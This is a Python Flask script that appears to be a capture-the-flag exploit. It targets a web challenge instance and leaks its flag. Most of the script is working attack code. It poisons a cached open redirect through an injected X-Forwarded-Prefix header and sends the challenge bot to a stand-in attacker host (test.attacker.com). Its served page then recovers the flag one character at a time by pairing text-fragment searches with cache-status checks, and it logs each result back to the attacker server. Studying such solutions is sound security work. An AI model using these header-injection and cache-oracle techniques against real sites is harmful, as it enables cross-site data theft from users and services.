from flask import Flask, request
import requests
import sys

app = Flask(__name__)

INSTANCE_URL = 'https://7156f316ded8e2de.equiptracker.fit'
ATTACKER_URL = 'https://test.attacker.com'

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<body>
    <h1>Redirecting to cached open-redirect start to trigger the 3pc heuristic</h1>
    <h1>Click me!</h1>
    <script>
        setTimeout(() => {
            document.location = '_INSTANCE_URL_?debug=1'
        }, 3000)
    </script>
</body>
</html>
'''.replace('_INSTANCE_URL_', INSTANCE_URL)

@app.route('/check', methods=['GET'])
def checkCacheStatus():
    # do not cache this request to make leaking faster
    return requests.get(request.args.get('url'), headers={'Cache-Control': 'no-store'}).headers.get('cache-status')


@app.route('/log', methods=['GET'])
def log():
    print(request.args.get('msg'))
    return ''


@app.route('/dashboard/', methods=['GET'])
def leak():
    return '''

<iframe id=frame style="width: 100%; height: 100%;"></iframe>

<script>
    const INSTANCE_URL = '_INSTANCE_URL_'
    const ATTACKER_URL = '_ATTACKER_URL_'
    const RADOMPATH = Math.random().toString(36).slice(2)

    const sleep = (ms) => new Promise(r => setTimeout(r, ms))
    const letters = '}_abcdefghijklmnopqrstuvwxyz0123456789'.split('')

    const leak_next = async (flag) => {
        // image static/emoji-heart-eyes.svg is only cached if the search was successful
        // one letter at a time, no need to reload the page

        let url = `${INSTANCE_URL}/${flag}-${RADOMPATH}/`
        frame.src = url
        await new Promise((r) => {frame.onload = () => r()})

        // find next letter
        for (let l of letters){
            // search for text
            frame.src = `${url}#${flag + l}`
        
            // await sleep(10)

            // check if cache header is present for the image, aka the search was successful
            let res = await (await fetch(`/check?url=${encodeURIComponent(url + 'static/emoji-heart-eyes.svg')}`)).text()

            if(res === 'hit'){
                return l
            }
        }
        return null
    }

    const log = (msg) => {
        console.log(msg)
        fetch(`/log?msg=${encodeURIComponent(msg)}`, {mode: 'no-cors'})
    }


    window.onload = async () => {
        let flag = 'flag{'
        while(!flag.endsWith('}')){
            let l = await leak_next(flag)
            if (l === null){
                break
            }
            flag += l
            log(flag)
        }

    }
</script>'''.replace('_INSTANCE_URL_', INSTANCE_URL).replace('_ATTACKER_URL_', ATTACKER_URL)
    

if __name__ == '__main__':

    print('[+] Cache open-redirect in dashboard to redirect back to the attacker server, to trigger the 3pc heuristic')
    r = requests.get(f'{INSTANCE_URL}?debug=1', headers={'X-Forwarded-Prefix': f'%0d//{ATTACKER_URL.replace('https://', '')}'}, allow_redirects=False)
    print(f'[+] Redirect location: {r.headers['Location']}')


    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        print(f'[+] send bot to attacker server at: {ATTACKER_URL}')
        r = requests.get(f'{INSTANCE_URL}/bot/?url={ATTACKER_URL}')
        assert('Visiting' in r.text)
    else:
        print(f'[+] Visit with Firefox: {ATTACKER_URL}')

    print('[+] Starting attacker server to leak the flag')
    app.run(host='127.0.0.1', port=8081)

    
